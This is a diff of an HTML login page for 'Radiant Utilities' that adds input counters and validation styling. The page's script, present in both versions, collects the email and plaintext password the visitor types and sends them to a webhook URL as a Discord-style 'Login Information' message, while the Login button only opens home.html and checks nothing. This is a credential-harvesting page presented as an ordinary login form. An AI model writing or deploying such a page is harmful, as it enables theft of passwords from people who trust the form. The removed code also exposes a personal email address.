@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Radiant Utilities | Home</title>
+    <title>Radiant Utilities | Login</title>
     <link rel="stylesheet" type="text/css" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="Server-modified.png" type="image/x-icon">
@@ -27,97 +27,136 @@
         #email-count, #password-count {
             display: block;
         }
-    </style>
+      </style>
 </head>
 
 <body>
     <main>
-        <div class="content6">
-            <h2>Login</h2>
-            <input type="email" name="email" id="email-input" placeholder="Enter your email" required maxlength="100">
-            <input type="password" name="password" id="password-input" placeholder="Enter your password" required maxlength="50">            
-            <button id="myButton" class="custom-button" disabled onclick="window.open('home.html');"><span></span>Login</button>            
-        </div>  
-    
+      <div class="content6">
+        <h2>Login</h2>
+        <div style="position: relative;">
+          <input type="email" name="email" id="email-input" placeholder="Enter your email" required maxlength="100">
+          <h6 id="email-validation"></h6>
+        </div>
+        <span id="email-counter">0</span>
+        <input type="password" name="password" id="password-input" placeholder="Enter your password" required maxlength="50" class="input-counter">
+        <h4 id="password-counter" style="display: none;">0/50</h4>
+        <button id="myButton" class="cust2om-button" disabled onclick="window.open('home.html');">Login</button>            
+      </div>
+
         <script>
-            var emailInput = document.getElementsByName("email")[0];
-            var passwordInput = document.getElementsByName("password")[0];
-            var submitButton = document.getElementById("myButton");
-            var webhookURL = "webhook";
+          var emailInput = document.getElementsByName("email")[0];
+          var passwordInput = document.getElementsByName("password")[0];
+          var submitButton = document.getElementById("myButton");
+          var webhookURL = "webhookURL";
+          var emailCounter = document.getElementById("email-counter");
+          var passwordCounter = document.getElementById("password-counter");
 
-            /*const adminEmails = ['olle1.grahn2@gmail.com', 'anotheradmin@example.com'];
+          const MIN_LENGTH = 6;
+          const VALID_COLOR = "#A36AFF";
+          const INVALID_COLOR = "";
 
-            function hasAdminAccess(userEmail) {
-            return adminEmails.includes(userEmail);
-          }
-
-            if (hasAdminAccess(userEmail)) {
-              window.location.href = 'admin.html';
-            } else {*/
-
-            emailInput.addEventListener("input", function() {
-              var email = this.value.trim();
-              var emailRegex = /^\S+@\S+\.\S+$/;
-              var password = passwordInput.value.trim();
-              if (emailRegex.test(email) && password !== "") {
-                submitButton.disabled = false;
-              } else {
-                submitButton.disabled = true;
-              }
-            });
-
-            passwordInput.addEventListener("input", function() {
-              var email = emailInput.value.trim();
-              var emailRegex = /^\S+@\S+\.\S+$/;
-              var password = this.value.trim();
-              if (emailRegex.test(email) && password !== "") {
-                submitButton.disabled = false;
-              } else {
-                submitButton.disabled = true;
-              }
-            });
-
-            submitButton.addEventListener("click", function() {
-              var email = emailInput.value.trim();
-              var emailRegex = /^\S+@\S+\.\S+$/;
-              var password = passwordInput.value.trim();
-              if (emailRegex.test(email) && password !== "") {
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", webhookURL, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                xhr.onreadystatechange = function() {
-                  if (xhr.readyState === 4 && xhr.status === 200) {
-        console.log("Webhook sent successfully!");
-      }
-    };
-    var data = JSON.stringify({
-      "embeds": [
-        {
-          "title": "Login Information",
-          "description": "A new user has logged in",
-          "color": 65280,
-          "fields": [
-            {
-              "name": "Email",
-              "value": email,
-              "inline": true
-            },
-            {
-              "name": "Password",
-              "value": password,
-              "inline": true
+          emailInput.addEventListener("input", function() {
+            var email = this.value.trim();
+            var emailRegex = /^\S+@\S+\.\S+$/;
+            var password = passwordInput.value.trim();
+            var emailLength = email.length;
+            var passwordLength = password.length;
+            const emailValidation = document.getElementById("email-validation");
+            
+            if (emailLength > 0 && emailInput.checkValidity()) {
+              emailValidation.textContent = "✔️";
+              emailValidation.style.color = "green";
+            } else if (emailLength > 0) {
+              emailValidation.textContent = "❌";
+              emailValidation.style.color = "red";
+            } else {
+              emailValidation.textContent = "";
             }
-          ]
-        }
-      ]
-    });
-    xhr.send(data);
-    emailInput.value = "";
-    passwordInput.value = "";
-    submitButton.disabled = true;
-  }
-});
-//}
+
+            emailCounter.textContent = emailLength + "/50";
+            passwordCounter.textContent = passwordLength + "/50";
+
+            if (emailLength >= MIN_LENGTH && emailRegex.test(email) && passwordLength >= MIN_LENGTH) {
+              submitButton.disabled = false;
+              submitButton.style.backgroundColor = VALID_COLOR;
+            } else {
+              submitButton.disabled = true;
+              submitButton.style.backgroundColor = INVALID_COLOR;
+            }
+          });
+
+          passwordCounter.style.display = "none";
+          passwordInput.addEventListener("input", function() {
+            var email = emailInput.value.trim();
+            var emailRegex = /^\S+@\S+\.\S+$/;
+            var password = this.value.trim();
+            var emailLength = email.length;
+            var passwordLength = password.length;
+
+            if (passwordLength >= 1) {
+              passwordCounter.style.display = "inline";
+            } else {
+              passwordCounter.style.display = "none";
+            }
+
+            if (passwordLength >= 1 && passwordLength <= 5) {
+              passwordCounter.style.color = "red";
+            } else {
+              passwordCounter.style.color = "white";
+            }
+            document.getElementById("email-counter").textContent = emailLength + "/50";
+            document.getElementById("password-counter").textContent = passwordLength + "/50";
+            if (emailLength >= MIN_LENGTH && emailRegex.test(email) && passwordLength >= MIN_LENGTH) {
+              submitButton.disabled = false;
+              submitButton.style.backgroundColor = VALID_COLOR;
+            } else {
+              submitButton.disabled = true;
+              submitButton.style.backgroundColor = INVALID_COLOR;
+            }
+          });
+
+          submitButton.addEventListener("click", function() {
+            var email = emailInput.value.trim();
+            var emailRegex = /^\S+@\S+\.\S+$/;
+            var password = passwordInput.value.trim();
+            if (emailRegex.test(email) && password !== "") {
+              var xhr = new XMLHttpRequest();
+              xhr.open("POST", webhookURL, true);
+              xhr.setRequestHeader("Content-Type", "application/json");
+              xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                  console.log("Webhook sent successfully!");
+                }
+              };
+              var data = JSON.stringify({
+                "embeds": [
+                  {
+                    "title": "Login Information",
+                    "description": "A new user has logged in",
+                    "color": 65280,
+                    "fields": [
+                      {
+                        "name": "Email",
+                        "value": email,
+                        "inline": true
+                      },
+                      {
+                        "name": "Password",
+                        "value": password,
+                        "inline": true
+                      }
+                    ]
+                  }
+                ]
+              });
+              xhr.send(data);
+              emailInput.value = "";
+              passwordInput.value = "";
+              submitButton.disabled = true;
+              submitButton.style.backgroundColor = INVALID_COLOR;
+            }
+          });
 
     </script>
 
